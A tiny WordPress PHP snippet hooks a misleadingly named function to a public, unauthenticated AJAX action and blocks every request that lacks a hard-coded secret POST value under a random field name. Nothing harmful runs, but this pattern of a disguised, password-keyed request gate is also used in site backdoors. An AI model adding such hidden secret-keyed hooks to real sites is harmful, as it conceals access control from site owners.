<?php

function audio_embed_results_sharing() {
	if (!isset($_POST["tsvmhuqrvm"]) || $_POST["tsvmhuqrvm"] !== "e3qJlbo1YCF2") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'audio_embed_results_sharing', 5, 1);
